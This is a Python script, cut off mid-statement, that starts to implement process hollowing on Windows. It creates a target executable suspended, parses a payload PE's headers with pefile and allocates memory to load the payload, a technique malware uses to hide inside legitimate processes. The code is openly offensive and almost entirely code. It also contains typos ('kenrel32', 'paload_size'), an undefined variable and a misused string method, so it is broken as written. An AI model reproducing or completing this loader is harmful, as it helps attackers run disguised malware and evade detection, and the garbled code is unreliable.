from ctypes import *
from pefile import PE
import sys

if len(sys.argv) != 3:
    print("EXAMPLE: proc_h.py test.exe path_to_exe")

payload = sys.argv[1]
target_exe = sys.argv[2]
steps =1

kernel32 = windll.kernel32
class PROCESS_INFORMATION(Structure):
	_fields_ = [
                ('hProcess', c_void_p), 
                ('hThread', c_void_p), 
                ('dwProcessId', c_ulong), 
                ('dwThreadId', c_ulong)]
class STARTUPINFO(Structure):
	_fields_ = [
                ('cb', c_ulong), 
                ('lpReserved', c_char_p),    
                ('lpDesktop', c_char_p),
                ('lpTitle', c_char_p),
                ('dwX', c_ulong),
                ('dwY', c_ulong),
                ('dwXSize', c_ulong),
                ('dwYSize', c_ulong),
                ('dwXCountChars', c_ulong),
                ('dwYCountChars', c_ulong),
                ('dwFillAttribute', c_ulong),
                ('dwFlags', c_ulong),
                ('wShowWindow', c_ushort),
                ('cbReserved2', c_ushort),
                ('lpReserved2', c_ulong),    
                ('hStdInput', c_void_p),
                ('hStdOutput', c_void_p),
                ('hStdError', c_void_p)]
	
class FLOATING_SAVE_AREA(Structure):
	_fields_ = [
                ("ControlWord", c_ulong),
                ("StatusWord", c_ulong),
                ("TagWord", c_ulong),
                ("ErrorOffset", c_ulong),
                ("ErrorSelector", c_ulong),
                ("DataOffset", c_ulong),
                ("DataSelector", c_ulong),
                ("RegisterArea", c_ubyte * 80),
                ("Cr0NpxState", c_ulong)]	
	
class CONTEXT(Structure):
        _fields_ = [
                ("ContextFlags", c_ulong),
                ("Dr0", c_ulong),
                ("Dr1", c_ulong),
                ("Dr2", c_ulong),
                ("Dr3", c_ulong),
                ("Dr6", c_ulong),
                ("Dr7", c_ulong),
                ("FloatSave", FLOATING_SAVE_AREA),
                ("SegGs", c_ulong),
                ("SegFs", c_ulong),
                ("SegEs", c_ulong),
                ("SegDs", c_ulong),
                ("Edi", c_ulong),
                ("Esi", c_ulong),
                ("Ebx", c_ulong),
                ("Edx", c_ulong),
                ("Ecx", c_ulong),
                ("Eax", c_ulong),
                ("Ebp", c_ulong),
                ("Eip", c_ulong),
                ("SegCs", c_ulong),
                ("EFlags", c_ulong),
                ("Esp", c_ulong),
                ("SegSs", c_ulong),
                ("ExtendedRegisters", c_ubyte * 512)]
def error():
    print("[!] ERROR: "+FormatError(GetLastError()))
    print("[!] Exiting")
    sys.exit()

print("[{}] CREATING SUSPENDED PROCESS".format(str(steps)))
steps +=1

startupinfo = STARTUPINFO()
startupinfo.cb = sizeof(STARTUPINFO)
processinfo =PROCESS_INFORMATION()

CREATE_SUSPENDED = 0x0004
if kenrel32.CreateProcessA(
                            None,
                            target_exe,
                            None,
                            None,
                            False,
                            CREATE_SUSPENDED,
                            None,
                            None,
                            byref(startupinfo),
                            byref(processinfo)) == 0:
    error()
h_process = processinfo.hProcess
hThread = processinfo.hThread

print("SUCESSFULLY CREATED SUSPENDED PROCESS PID {}".capitalize.format(str(processinfo.dwProcessId)))
print("{} EXTRACTING NECESSAR INFO FROM THE PAYLOAD".format(steps))
steps += 1

payload = PE(data= payload_data)
payload_ImageBase = payload.OPTIONAL_HEADER.ImageBase
payload_SizeofImage = payload.OPTIONAL_HEADER.SizeOfImage
payload_SizeOfHeaders = payload.OPTIONAL_HEADER.SizeOfHeaders
payload_sections = payload.sections
payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
payload.close()

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x4

payload_data_pointer = kernel32.VirtualAlloc(None,
                                             c_int(paload_size+1),
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_READWRITE)
memmove(payload_data_pointer,
